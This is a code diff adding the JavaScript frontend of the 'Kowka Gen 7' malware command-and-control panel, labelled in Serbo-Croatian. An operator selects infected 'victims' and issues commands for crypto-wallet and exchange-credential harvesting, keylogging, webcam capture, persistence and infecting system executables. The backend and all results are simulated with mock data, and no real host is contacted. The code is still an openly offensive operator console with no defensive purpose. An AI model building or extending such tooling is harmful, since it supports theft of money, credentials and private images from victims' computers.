-            statusElements.audit.innerHTML = '📊 Audit Logging: <span style="color: #00ff00;">STREAMING</span>';
-            statusElements.security.innerHTML = '🛡️ Operational Security: <span style="color: #00ff00;">OPERATIONAL</span>';
-        }, 2000);
+        // =============================================
+        // KOWKA GEN 7 CONTROL CENTER - FRONTEND ENGINE
+        // =============================================
+        
+        class KowkaControlCenter {
+            constructor() {
+                this.commandHistory = [];
+                this.victims = new Map();
+                this.activeVictim = null;
+                this.backendConnected = false;
+                this.systemStatus = {
+                    operational: true,
+                    threatLevel: 2,
+                    activeAgents: 0,
+                    c2Status: 'connected'
+                };
+                
+                this.initializeControlCenter();
+                this.startSystemLoops();
+            }
+            
+            initializeControlCenter() {
+                // Set up current date and time
+                this.updateClock();
+                setInterval(() => this.updateClock(), 1000);
+                
+                // Set current date in Yugoslav format
+                const now = new Date();
+                document.getElementById('current-date').textContent = 
+                    now.toLocaleDateString('sr-RS', { 
+                        day: '2-digit', 
+                        month: '2-digit', 
+                        year: 'numeric' 
+                    });
+                
+                // Set up command input handler
+                const commandInput = document.getElementById('command-input');
+                commandInput.addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        this.processCommandInput();
+                    }
+                });
+                
+                // Set up command input focus for help
+                commandInput.addEventListener('focus', () => {
+                    document.getElementById('command-help').style.display = 'block';
+                });
+                
+                commandInput.addEventListener('blur', () => {
+                    document.getElementById('command-help').style.display = 'none';
+                });
+                
+                // Initialize with mock victims for demonstration
+                this.initializeMockVictims();
+                
+                // Connect to backend (simulated)
+                this.connectToBackend();
+                
+                this.logToTerminal('KONTROLNI CENTER INICIJALIZIRAN', 'system');
+                this.logToTerminal('SPREMAN ZA PRIJEM KOMANDI', 'success');
+            }
+            
+            connectToBackend() {
+                this.logToTerminal('POVEZIVANJE SA BACKEND SISTEMOM...', 'system');
+                
+                // Simulate backend connection
+                setTimeout(() => {
+                    this.backendConnected = true;
+                    this.logToTerminal('BACKEND KONEKCIJA USPOSTAVLJENA', 'success');
+                    this.logToTerminal('GITHUB C2 PROTOKOL: AKTIVAN', 'system');
+                    this.updateSystemStatus();
+                }, 2000);
+            }
+            
+            initializeMockVictims() {
+                // Add mock victims for demonstration
+                const mockVictims = [
+                    { id: '7F3A', hostname: 'WORKSTATION-ALPHA', os: 'Windows 11', status: 'active', lastSeen: Date.now() },
+                    { id: '8B2C', hostname: 'LAPTOP-BETA', os: 'Windows 10', status: 'active', lastSeen: Date.now() - 300000 },
+                    { id: '9D4E', hostname: 'SERVER-GAMMA', os: 'Linux', status: 'inactive', lastSeen: Date.now() - 1800000 }
+                ];
+                
+                mockVictims.forEach(victim => {
+                    this.victims.set(victim.id, victim);
+                });
+                
+                this.updateVictimList();
+                this.updateSystemStatus();
+            }
+            
+            updateClock() {
+                const now = new Date();
+                const timeString = now.toLocaleTimeString('sr-RS');
+                document.getElementById('system-clock').textContent = timeString;
+            }
+            
+            processCommandInput() {
+                const input = document.getElementById('command-input');
+                const commandText = input.value.trim();
+                
+                if (!commandText) return;
+                
+                // Add to command history
+                this.addToCommandHistory(commandText);
+                
+                // Clear input
+                input.value = '';
+                
+                // Process the command
+                this.processCommand(commandText);
+            }
+            
+            processCommand(commandText) {
+                this.logToTerminal(`KOMANDA: ${commandText}`, 'command');
+                
+                // Parse command
+                const parts = commandText.split(' ');
+                const firstPart = parts[0];
+                
+                if (firstPart.startsWith('/')) {
+                    // Handle different command types
+                    if (firstPart === '/help') {
+                        this.showHelp();
+                    } else if (firstPart === '/list') {
+                        this.listVictims();
+                    } else if (firstPart === '/status') {
+                        this.showSystemStatus();
+                    } else if (firstPart.startsWith('/') && firstPart.length > 1) {
+                        // Victim-specific command: /[victim_id] [command]
+                        this.processVictimCommand(commandText);
+                    } else {
+                        this.logToTerminal('NEPOZNATA KOMANDA. KORISTITE /help ZA POMOĆ.', 'error');
+                    }
+                } else {
+                    this.logToTerminal('KOMANDE MORAJU POČINJATI SA /. KORISTITE /help ZA POMOĆ.', 'error');
+                }
+            }
+            
+            processVictimCommand(commandText) {
+                // Parse victim ID and command
+                const parts = commandText.substring(1).split(' ');
+                const victimId = parts[0];
+                const command = parts.slice(1).join(' ');
+                
+                if (!command) {
+                    this.logToTerminal('NIJE NAVEDENA KOMANDA ZA ŽRTVU.', 'error');
+                    return;
+                }
+                
+                // Check if victim exists
+                const victim = this.victims.get(victimId);
+                if (!victim) {
+                    this.logToTerminal(`ŽRTAVA ${victimId} NIJE PRONAĐENA.`, 'error');
+                    return;
+                }
+                
+                // Set as active victim
+                this.activeVictim = victimId;
+                this.updateCommandPrompt();
+                
+                // Send command to backend
+                this.sendCommandToBackend(victimId, command);
+            }
+            
+            async sendCommandToBackend(victimId, command) {
+                this.logToTerminal(`SLANJE KOMANDE ŽRTVI ${victimId}: ${command}`, 'system');
+                
+                // Show command progress
+                this.showCommandProgress(true);
+                
+                try {
+                    // Simulate backend API call
+                    const result = await this.simulateBackendCommand(victimId, command);
+                    
+                    this.logToTerminal(`KOMANDA USPJEŠNO POSLATA. REZULTATI ZA 10 MINUTA.`, 'success');
+                    
+                    // Schedule result collection
+                    setTimeout(() => {
+                        this.collectCommandResults(victimId, command);
+                    }, 10000); // 10 minutes in real implementation, 10 seconds for demo
+                    
+                } catch (error) {
+                    this.logToTerminal(`GREŠKA PRI SLANJU KOMANDE: ${error.message}`, 'error');
+                    this.showCommandProgress(false);
+                }
+            }
+            
+            async simulateBackendCommand(victimId, command) {
+                // Simulate backend processing
+                return new Promise((resolve, reject) => {
+                    // Simulate network delay
+                    setTimeout(() => {
+                        // Simulate random failures (10% chance)
+                        if (Math.random() < 0.1) {
+                            reject(new Error('C2 KONEKCIJA ODBIJENA'));
+                        } else {
+                            resolve({
+                                success: true,
+                                operationId: `op_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`,
+                                victimId: victimId,
+                                command: command,
+                                timestamp: Date.now()
+                            });
+                        }
+                    }, 2000);
+                });
+            }
+            
+            async collectCommandResults(victimId, originalCommand) {
+                this.logToTerminal(`PRIKUPLJANJE REZULTATA ZA: ${originalCommand}`, 'system');
+                
+                // Show data receive progress
+                this.showDataReceiveProgress(true);
+                
+                try {
+                    // Simulate collecting results from backend
+                    const results = await this.simulateResultsCollection(victimId, originalCommand);
+                    
+                    this.displayCommandResults(victimId, originalCommand, results);
+                    this.logToTerminal(`REZULTATI PRIKUPLJENI ZA: ${originalCommand}`, 'success');
+                    
+                } catch (error) {
+                    this.logToTerminal(`GREŠKA PRI PRIKUPLJANJU REZULTATA: ${error.message}`, 'error');
+                } finally {
+                    this.showDataReceiveProgress(false);
+                    this.showCommandProgress(false);
+                }
+            }
+            
+            async simulateResultsCollection(victimId, command) {
+                // Simulate delay for results
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        // Generate realistic mock results based on command
+                        const mockResults = this.generateMockResults(victimId, command);
+                        resolve(mockResults);
+                    }, 3000);
+                });
+            }
+            
+            generateMockResults(victimId, command) {
+                // Generate realistic mock data based on command type
+                const commandHandlers = {
+                    'system_intelligence': () => this.generateSystemIntel(victimId),
+                    'financial_intelligence': () => this.generateFinancialIntel(victimId),
+                    'crypto_harvest': () => this.generateCryptoHarvest(victimId),
+                    'keylogger status': () => this.generateKeyloggerStatus(victimId),
+                    'screenshot': () => this.generateScreenshotResult(victimId),
+                    'webcam capture': () => this.generateWebcamResult(victimId),
+                    'wallet_extraction': () => this.generateWalletExtraction(victimId),
+                    'exchange_credentials': () => this.generateExchangeCredentials(victimId),
+                    'persistence': () => this.generatePersistenceResult(victimId),
+                    'file_infect strategic': () => this.generateFileInfectResult(victimId),
+                    'status': () => this.generateStatusResult(victimId)
+                };
+                
+                const handler = commandHandlers[command];
+                return handler ? handler() : { error: `Nepoznata komanda: ${command}` };
+            }
+            
+            generateSystemIntel(victimId) {
+                const victim = this.victims.get(victimId);
+                return {
+                    type: 'system_intelligence',
+                    victim: victimId,
+                    hostname: victim.hostname,
+                    os: victim.os,
+                    architecture: 'x64',
+                    processor: 'Intel Core i7-12700K',
+                    memory: '32GB',
+                    disks: ['C: (465GB)', 'D: (931GB)'],
+                    users: ['Administrator', 'User'],
+                    processes: Math.floor(Math.random() * 200) + 50,
+                    uptime: Math.floor(Math.random() * 86400) + 3600,
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateFinancialIntel(victimId) {
+                return {
+                    type: 'financial_intelligence',
+                    victim: victimId,
+                    bank_accounts: Math.floor(Math.random() * 4),
+                    crypto_wallets: Math.floor(Math.random() * 6) + 2,
+                    credit_cards: Math.floor(Math.random() * 3),
+                    investment_accounts: Math.floor(Math.random() * 2),
+                    total_estimated_value: Math.floor(Math.random() * 75000) + 5000,
+                    documents_found: Math.floor(Math.random() * 15) + 5,
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateCryptoHarvest(victimId) {
+                const wallets = ['MetaMask', 'Exodus', 'Electrum', 'Trust Wallet', 'Coinbase Wallet'];
+                const foundWallets = wallets.slice(0, Math.floor(Math.random() * 3) + 2);
+                
+                return {
+                    type: 'crypto_harvest',
+                    victim: victimId,
+                    wallets_found: foundWallets.length,
+                    wallet_names: foundWallets,
+                    private_keys: Math.floor(Math.random() * 3),
+                    recovery_phrases: Math.floor(Math.random() * 2),
+                    estimated_value: Math.floor(Math.random() * 25000) + 1000,
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateKeyloggerStatus(victimId) {
+                return {
+                    type: 'keylogger_status',
+                    victim: victimId,
+                    is_logging: true,
+                    buffer_size: Math.floor(Math.random() * 500) + 100,
+                    session_duration: Math.floor(Math.random() * 3600) + 600,
+                    intelligence_value: Math.floor(Math.random() * 1000) + 100,
+                    current_context: 'web_browser',
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateScreenshotResult(victimId) {
+                return {
+                    type: 'screenshot',
+                    victim: victimId,
+                    count: 1,
+                    resolution: '1920x1080',
+                    format: 'JPEG',
+                    size: Math.floor(Math.random() * 500000) + 100000,
+                    encrypted_data: `base64_encoded_data_${Math.random().toString(36).substr(2, 16)}`,
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateWebcamResult(victimId) {
+                return {
+                    type: 'webcam_capture',
+                    victim: victimId,
+                    action: 'capture',
+                    resolution: '1280x720',
+                    duration: 0,
+                    format: 'JPEG',
+                    size: Math.floor(Math.random() * 300000) + 50000,
+                    encrypted_data: `base64_encoded_data_${Math.random().toString(36).substr(2, 16)}`,
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateWalletExtraction(victimId) {
+                return {
+                    type: 'wallet_extraction',
+                    victim: victimId,
+                    metamask_wallets: Math.floor(Math.random() * 2) + 1,
+                    electrum_wallets: Math.floor(Math.random() * 2),
+                    exodus_wallets: Math.floor(Math.random() * 1),
+                    total_wallets: Math.floor(Math.random() * 4) + 1,
+                    extraction_method: 'automatic',
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateExchangeCredentials(victimId) {
+                const exchanges = ['Binance', 'Coinbase', 'Kraken', 'Crypto.com'];
+                const foundExchanges = exchanges.slice(0, Math.floor(Math.random() * 2) + 1);
+                
+                return {
+                    type: 'exchange_credentials',
+                    victim: victimId,
+                    exchanges_found: foundExchanges.length,
+                    exchange_names: foundExchanges,
+                    credentials_extracted: Math.floor(Math.random() * 3) + 1,
+                    two_factor_enabled: Math.random() > 0.5,
+                    timestamp: Date.now()
+                };
+            }
+            
+            generatePersistenceResult(victimId) {
+                return {
+                    type: 'persistence',
+                    victim: victimId,
+                    success_count: Math.floor(Math.random() * 4) + 2,
+                    methods: ['registry', 'scheduled_task', 'service', 'startup_folder'].slice(0, Math.floor(Math.random() * 3) + 2),
+                    platform: 'windows',
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateFileInfectResult(victimId) {
+                return {
+                    type: 'file_infect',
+                    victim: victimId,
+                    infection_type: 'strategic',
+                    files_infected: Math.floor(Math.random() * 10) + 5,
+                    infected_files: ['notepad.exe', 'explorer.exe', 'chrome.exe'].slice(0, Math.floor(Math.random() * 2) + 1),
+                    timestamp: Date.now()
+                };
+            }
+            
+            generateStatusResult(victimId) {
+                const victim = this.victims.get(victimId);
+                return {
+                    type: 'status',
+                    victim: victimId,
+                    status: victim.status,
+                    last_seen: victim.lastSeen,
+                    hostname: victim.hostname,
+                    os: victim.os,
+                    operational: victim.status === 'active',
+                    timestamp: Date.now()
+                };
+            }
+            
+            displayCommandResults(victimId, command, results) {
+                // Update live data feed
+                this.updateLiveDataFeed(victimId, command, results);
+                
+                // Log results to terminal
+                this.logToTerminal(`REZULTATI ZA ${victimId} - ${command}:`, 'success');
+                
+                // Format and display results
+                Object.keys(results).forEach(key => {
+                    if (key !== 'type' && key !== 'victim' && key !== 'timestamp') {
+                        this.logToTerminal(`  ${key}: ${results[key]}`, 'system');
+                    }
+                });
+                
+                // Update system metrics based on results
+                this.updateSystemMetrics(results);
+            }
+            
+            updateLiveDataFeed(victimId, command, results) {
+                const feed = document.getElementById('live-data-feed');
+                const timestamp = new Date().toLocaleTimeString();
+                
+                let feedText = `> VRIJEME: ${timestamp}\n`;
+                feedText += `> CILJ: ${victimId}\n`;
+                feedText += `> KOMANDA: ${command}\n`;
+                feedText += `> TIP: ${results.type}\n`;
+                
+                // Add key results
+                const keyResults = Object.keys(results)
+                    .filter(key => !['type', 'victim', 'timestamp'].includes(key))
+                    .slice(0, 3);
+                
+                keyResults.forEach(key => {
+                    feedText += `> ${key.toUpperCase()}: ${results[key]}\n`;
+                });
+                
+                feedText += `> SLJEDEĆI PRIJEM: ${new Date(Date.now() + 10 * 60 * 1000).toLocaleTimeString()}`;
+                
+                feed.textContent = feedText;
+            }
+            
+            updateSystemMetrics(results) {
+                // Update various metrics based on collected data
+                if (results.type === 'financial_intelligence') {
+                    document.getElementById('data-wallets').textContent = results.crypto_wallets || 0;
+                    document.getElementById('data-documents').textContent = results.documents_found || 0;
+                }
+                
+                // Update quick overview
+                this.updateQuickOverview();
+            }
+            
+            updateQuickOverview() {
+                const overview = document.getElementById('quick-overview');
+                const timestamp = new Date().toLocaleTimeString();
+                
+                overview.textContent = `> SISTEM: KOWKA GEN 7\n> VERZIJA: 7.0.1\n> C2 PROTOKOL: GITHUB\n> KRIPTOGRAFIJA: KVANTNA\n> STANJE: OPERATIVNO\n> ZADNJA PROVJERA: ${timestamp}\n> SLJEDEĆA: ${new Date(Date.now() + 30000).toLocaleTimeString()}`;
+            }
+            
+            showCommandProgress(running = true) {
+                const progressBar = document.getElementById('command-progress-bar');
+                const progressText = document.getElementById('command-progress-text');
+                const activeCommand = document.getElementById('active-command');
+                
+                if (running) {
+                    activeCommand.textContent = 'IZVRŠAVANJE';
+                    activeCommand.style.color = 'var(--warning-yellow)';
+                    
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += 2;
+                        progressBar.style.width = `${progress}%`;
+                        progressText.textContent = `IZVRŠAVANJE: ${progress}%`;
+                        
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            progressText.textContent = 'PROSLJEĐIVANJE...';
+                        }
+                    }, 100);
+                } else {
+                    progressBar.style.width = '0%';
+                    progressText.textContent = 'STANJE: MIRUJANJE';
+                    activeCommand.textContent = 'NEMA';
+                    activeCommand.style.color = 'var(--warning-yellow)';
+                }
+            }
+            
+            showDataReceiveProgress(receiving = true) {
+                const progressBar = document.getElementById('data-receive-bar');
+                const progressText = document.getElementById('data-receive-text');
+                
+                if (receiving) {
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += 5;
+                        progressBar.style.width = `${progress}%`;
+                        progressText.textContent = `PRIJEM: ${progress}%`;
+                        
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            progressText.textContent = 'DEŠIFROVANJE...';
+                            setTimeout(() => {
+                                progressBar.style.width = '0%';
+                                progressText.textContent = 'PRIJEM: KOMPLETIRAN';
+                            }, 1000);
+                        }
+                    }, 200);
+                } else {
+                    progressBar.style.width = '0%';
+                    progressText.textContent = 'PRIJEM: ČEKANJE';
+                }
+            }
+            
+            logToTerminal(message, type = 'info') {
+                const terminal = document.getElementById('terminal-output');
+                const timestamp = new Date().toLocaleTimeString();
+                
+                const logEntry = document.createElement('div');
+                logEntry.className = `log-entry ${type}`;
+                
+                let victimInfo = '';
+                if (this.activeVictim) {
+                    victimInfo = `<span class="log-victim">[${this.activeVictim}]</span> `;
+                }
+                
+                logEntry.innerHTML = `
+                    <div class="log-time">[${timestamp}] ${victimInfo}</div>
+                    <div class="log-message">${message}</div>
+                `;
+                
+                terminal.appendChild(logEntry);
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+            
+            addToCommandHistory(command) {
+                this.commandHistory.push({
+                    command: command,
+                    timestamp: Date.now(),
+                    victim: this.activeVictim
+                });
+                
+                // Update command history display
+                this.updateCommandHistory();
+            }
+            
+            updateCommandHistory() {
+                const historyElement = document.getElementById('command-history');
+                historyElement.innerHTML = '';
+                
+                // Show last 10 commands
+                const recentCommands = this.commandHistory.slice(-10).reverse();
+                
+                recentCommands.forEach(cmd => {
+                    const historyItem = document.createElement('div');
+                    historyItem.className = 'history-item';
+                    
+                    const time = new Date(cmd.timestamp).toLocaleTimeString();
+                    const victimInfo = cmd.victim ? `[${cmd.victim}] ` : '';
+                    
+                    historyItem.textContent = `${time} ${victimInfo}${cmd.command}`;
+                    historyItem.onclick = () => {
+                        document.getElementById('command-input').value = cmd.command;
+                    };
+                    
+                    historyElement.appendChild(historyItem);
+                });
+            }
+            
+            updateCommandPrompt() {
+                const prompt = document.getElementById('command-prompt');
+                if (this.activeVictim) {
+                    prompt.textContent = `KOWKA:${this.activeVictim}>`;
+                } else {
+                    prompt.textContent = 'KOWKA>';
+                }
+            }
+            
+            updateVictimList() {
+                const victimList = document.getElementById('victim-list');
+                victimList.innerHTML = '';
+                
+                this.victims.forEach((victim, id) => {
+                    const victimItem = document.createElement('div');
+                    victimItem.className = `victim-item ${victim.status} ${this.activeVictim === id ? 'active' : ''}`;
+                    victimItem.onclick = () => {
+                        this.activeVictim = id;
+                        this.updateCommandPrompt();
+                        this.updateVictimList();
+                    };
+                    
+                    const lastSeen = new Date(victim.lastSeen).toLocaleTimeString();
+                    
+                    victimItem.innerHTML = `
+                        <div class="victim-id">${id}</div>
+                        <div class="victim-info">${victim.hostname}</div>
+                        <div class="victim-info">${victim.os} • ${victim.status}</div>
+                        <div class="victim-info">ZADNJI PUT VIĐEN: ${lastSeen}</div>
+                    `;
+                    
+                    victimList.appendChild(victimItem);
+                });
+            }
+            
+            updateSystemStatus() {
+                // Update status indicators
+                document.getElementById('status-operational').textContent = 
+                    this.systemStatus.operational ? 'AKTIVNO' : 'ISKLJUČENO';
+                
+                document.getElementById('status-threat').textContent = 
+                    `${this.systemStatus.threatLevel}/10`;
+                
+                document.getElementById('status-agents').textContent = 
+                    this.victims.size;
+                
+                document.getElementById('status-c2').textContent = 
+                    this.systemStatus.c2Status.toUpperCase();
+                
+                // Update status indicators
+                document.getElementById('status-op-indicator').className = 
+                    `status-indicator ${this.systemStatus.operational ? 'active' : 'critical'}`;
+                
+                document.getElementById('status-threat-indicator').className = 
+                    `status-indicator ${this.systemStatus.threatLevel > 7 ? 'critical' : this.systemStatus.threatLevel > 4 ? 'warning' : ''}`;
+                
+                document.getElementById('status-agents-indicator').className = 
+                    `status-indicator ${this.victims.size > 0 ? 'active' : 'critical'}`;
+                
+                document.getElementById('status-c2-indicator').className = 
+                    `status-indicator ${this.systemStatus.c2Status === 'connected' ? 'active' : 'critical'}`;
+                
+                // Update system load (simulated)
+                const load = Math.floor(Math.random() * 40) + 20; // 20-60%
+                document.getElementById('system-load-bar').style.width = `${load}%`;
+                document.getElementById('system-load-text').textContent = 
+                    `OPTEREĆENJE: ${load}%`;
+            }
+            
+            showHelp() {
+                this.logToTerminal('DOSTUPNE KOMANDE:', 'system');
+                this.logToTerminal('  /help - Prikaži ovu pomoć', 'system');
+                this.logToTerminal('  /list - Prikaži sve aktivne žrtve', 'system');
+                this.logToTerminal('  /status - Status sistema', 'system');
+                this.logToTerminal('  /[id] [komanda] - Pošalji komandu žrtvi', 'system');
+                this.logToTerminal('', 'system');
+                this.logToTerminal('PRIMJERI:', 'system');
+                this.logToTerminal('  /7F3A system_intelligence - Sistem info za žrtvu 7F3A', 'system');
+                this.logToTerminal('  /8B2C financial_intelligence - Finansijski podaci', 'system');
+                this.logToTerminal('  /9D4E crypto_harvest - Kripto valute', 'system');
+            }
+            
+            listVictims() {
+                this.logToTerminal('AKTIVNE ŽRTVE:', 'system');
+                this.victims.forEach((victim, id) => {
+                    const status = victim.status === 'active' ? 'AKTIVNA' : 'NEAKTIVNA';
+                    const lastSeen = new Date(victim.lastSeen).toLocaleTimeString();
+                    this.logToTerminal(`  ${id} - ${victim.hostname} (${victim.os}) - ${status} - ${lastSeen}`, 'system');
+                });
+            }
+            
+            showSystemStatus() {
+                this.logToTerminal('STATUS SISTEMA:', 'system');
+                this.logToTerminal(`  OPERACIJE: ${this.systemStatus.operational ? 'AKTIVNO' : 'ISKLJUČENO'}`, 'system');
+                this.logToTerminal(`  NIVO PRIJETNJE: ${this.systemStatus.threatLevel}/10`, 'system');
+                this.logToTerminal(`  AKTIVNI AGENTI: ${this.victims.size}`, 'system');
+                this.logToTerminal(`  C2 STATUS: ${this.systemStatus.c2Status.toUpperCase()}`, 'system');
+                this.logToTerminal(`  BACKEND: ${this.backendConnected ? 'POVEZAN' : 'NEPOVEZAN'}`, 'system');
+            }
+            
+            startSystemLoops() {
+                // System status update loop
+                setInterval(() => {
+                    this.updateSystemStatus();
+                    this.updateQuickOverview();
+                }, 30000);
+                
+                // Victim status update loop
+                setInterval(() => {
+                    this.updateVictimStatus();
+                }, 60000);
+            }
+            
+            updateVictimStatus() {
+                // Simulate victim status changes
+                this.victims.forEach((victim, id) => {
+                    // Randomly change status
+                    if (Math.random() < 0.1) { // 10% chance to change status
+                        victim.status = Math.random() > 0.3 ? 'active' : 'inactive';
+                        victim.lastSeen = Date.now() - (Math.random() * 1800000); // Up to 30 minutes ago
+                    }
+                });
+                
+                this.updateVictimList();
+                this.updateSystemStatus();
+            }
+        }
+        
+        // Global functions for button handlers
+        function quickCommand(command) {
+            if (!kowkaControlCenter.activeVictim) {
+                kowkaControlCenter.logToTerminal('NIJE ODOBRENA ŽRTAVA. KORISTITE /[id] [komanda]', 'error');
+                return;
+            }
+            
+            const fullCommand = `/${kowkaControlCenter.activeVictim} ${command}`;
+            document.getElementById('command-input').value = fullCommand;
+            kowkaControlCenter.processCommandInput();
+        }
+        
+        function sendCommand(command) {
+            document.getElementById('command-input').value = `/${command}`;
+            kowkaControlCenter.processCommandInput();
+        }
+        
+        // Initialize control center when page loads
+        let kowkaControlCenter;
+        document.addEventListener('DOMContentLoaded', () => {
+            kowkaControlCenter = new KowkaControlCenter();
+        });
     </script>
 </body>
 </html>
